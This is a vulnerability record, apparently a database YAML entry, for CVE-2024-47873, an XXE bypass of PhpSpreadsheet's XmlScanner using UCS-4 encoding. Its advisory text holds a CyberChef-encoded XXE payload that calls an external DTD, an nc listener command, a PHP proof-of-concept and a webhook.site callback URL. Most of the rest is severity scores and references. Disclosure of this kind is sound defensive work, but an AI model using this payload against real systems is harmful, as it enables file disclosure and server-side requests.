@@ -1,0 +1,397 @@
+vulnerability_id: VCID-9na6-4699-zbec
+aliases:
+  - CVE-2024-47873
+  - GHSA-jw4x-v69f-hh5w
+summary: |
+  XmlScanner bypass leads to XXE
+  ### Summary
+  The [XmlScanner class](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php) has a [scan](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72) method which should prevent XXE attacks.
+
+  However, the regexes used in the `scan` method and the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51) method can be bypassed by using UCS-4 and encoding guessing as described in <https://www.w3.org/TR/xml/#sec-guessing-no-ext-info>.
+
+
+  ### Details
+  The `scan` method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the [`toUtf8` method](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76).
+  Then, the `scan` method uses a [regex](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79) which would also work with 16-bit encoding.
+
+  However, the regexes from the [findCharSet](https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51) method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <https://www.w3.org/TR/xml/#sec-guessing-no-ext-info>.
+
+  A payload for the `workbook.xml` file can for example be created with [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.).
+  If you open an Excel file containing the payload from the link above stored in the `workbook.xml` file with PhpSpreadsheet, you will receive an HTTP request on `127.0.0.1:12345`. You can test that an HTTP request is created by running the `nc -nlvp 12345` command before opening the file containing the payload with PhpSpreadsheet.
+
+  ### PoC
+
+  - Create a new folder.
+  - Run the `composer require phpoffice/phpspreadsheet` command in the new folder.
+  - Create an `index.php` file in that folder with the following content:
+  ```PHP
+  <?php
+  require 'vendor/autoload.php';
+
+  use PhpOffice\PhpSpreadsheet\Spreadsheet;
+  use PhpOffice\PhpSpreadsheet\Writer\Xlsx;
+
+  $spreadsheet = new Spreadsheet();
+
+  $inputFileType = 'Xlsx';
+  $inputFileName = './payload.xlsx';
+
+  /**  Create a new Reader of the type defined in $inputFileType  **/
+  $reader = \PhpOffice\PhpSpreadsheet\IOFactory::createReader($inputFileType);
+  /**  Advise the Reader that we only want to load cell data  **/
+  $reader->setReadDataOnly(true);
+
+  $worksheetData = $reader->listWorksheetInfo($inputFileName);
+
+  foreach ($worksheetData as $worksheet) {
+
+  $sheetName = $worksheet['worksheetName'];
+
+  echo "<h4>$sheetName</h4>";
+  /**  Load $inputFileName to a Spreadsheet Object  **/
+  $reader->setLoadSheetsOnly($sheetName);
+  $spreadsheet = $reader->load($inputFileName);
+
+  $worksheet = $spreadsheet->getActiveSheet();
+  print_r($worksheet->toArray());
+
+  }
+  ```
+  - Run the following command: `php -S 127.0.0.1:8080`
+  - Add the [payload.xlsx](https://github.com/user-attachments/files/17334157/payload.xlsx) file, which contains a payload similar to the payload from the details section, but with the URL `https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a` instead of the `http://127.0.0.1:12345/ext.dtd` URL, in the folder and open <https://127.0.0.1:8080> in a browser. You will see an HTTP request on <https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a>.
+
+  ### Impact
+  An attacker can bypass the sanitizer and achieve an [XXE attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).
+severities:
+  - score: '0.00019'
+    scoring_system: epss
+    scoring_elements: '0.03442'
+    published_at: '2025-04-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04043'
+    published_at: '2025-04-27 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04053'
+    published_at: '2025-04-26 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.0404'
+    published_at: '2025-04-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04039'
+    published_at: '2025-04-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04025'
+    published_at: '2025-04-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04089'
+    published_at: '2025-04-18 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04108'
+    published_at: '2025-04-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04073'
+    published_at: '2025-04-21 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.04082'
+    published_at: '2025-04-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00021'
+    scoring_system: epss
+    scoring_elements: '0.041'
+    published_at: '2025-04-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00027'
+    scoring_system: epss
+    scoring_elements: '0.05659'
+    published_at: '2025-04-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00034'
+    scoring_system: epss
+    scoring_elements: '0.08361'
+    published_at: '2025-04-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19713'
+    published_at: '2024-11-28 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19565'
+    published_at: '2024-11-20 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19601'
+    published_at: '2024-11-21 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19675'
+    published_at: '2024-11-23 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19666'
+    published_at: '2024-11-24 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19683'
+    published_at: '2024-11-26 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.19750'
+    published_at: '2024-12-03 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20031'
+    published_at: '2024-12-11 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20101'
+    published_at: '2024-12-13 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20198'
+    published_at: '2024-12-15 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20129'
+    published_at: '2024-12-17 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20121'
+    published_at: '2024-12-19 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20097'
+    published_at: '2024-12-27 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00049'
+    scoring_system: epss
+    scoring_elements: '0.20420'
+    published_at: '2025-01-16 00:00:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27228'
+    published_at: '2025-04-09 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27216'
+    published_at: '2025-04-14 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27235'
+    published_at: '2025-04-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27236'
+    published_at: '2025-04-12 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27266'
+    published_at: '2025-04-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27124'
+    published_at: '2025-03-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27262'
+    published_at: '2025-04-10 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27074'
+    published_at: '2025-03-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27225'
+    published_at: '2025-04-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27244'
+    published_at: '2025-04-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27254'
+    published_at: '2025-04-04 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27263'
+    published_at: '2025-04-05 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27188'
+    published_at: '2025-04-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00115'
+    scoring_system: epss
+    scoring_elements: '0.27189'
+    published_at: '2025-04-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: '0.00224'
+    scoring_system: epss
+    scoring_elements: '0.3066'
+    published_at: '2025-03-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/advisories/GHSA-jw4x-v69f-hh5w
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T18:28:33Z/
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w
+  - score: HIGH
+    scoring_system: cvssv3.1_qr
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T18:28:33Z/
+    published_at: None
+    url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47873
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-47873
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T18:28:33Z/
+    published_at: None
+    url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at: None
+    url: https://www.w3.org/TR/xml/#sec-guessing-no-ext-info
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://www.w3.org/TR/xml/#sec-guessing-no-ext-info
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2024-11-18T18:28:33Z/
+    published_at: None
+    url: https://www.w3.org/TR/xml/#sec-guessing-no-ext-info
+weaknesses:
+  - CWE-937
+  - CWE-1035
+  - CWE-611
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-47873
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php
+    reference_type:
+    reference_id:
+  - url: https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-47873
+    reference_type:
+    reference_id:
+  - url: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    reference_type:
+    reference_id:
+  - url: https://www.w3.org/TR/xml/#sec-guessing-no-ext-info
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
+    reference_type:
+    reference_id: cpe:2.3:a:phpoffice:phpspreadsheet:*:*:*:*:*:*:*:*
+  - url: https://github.com/advisories/GHSA-jw4x-v69f-hh5w
+    reference_type:
+    reference_id: GHSA-jw4x-v69f-hh5w
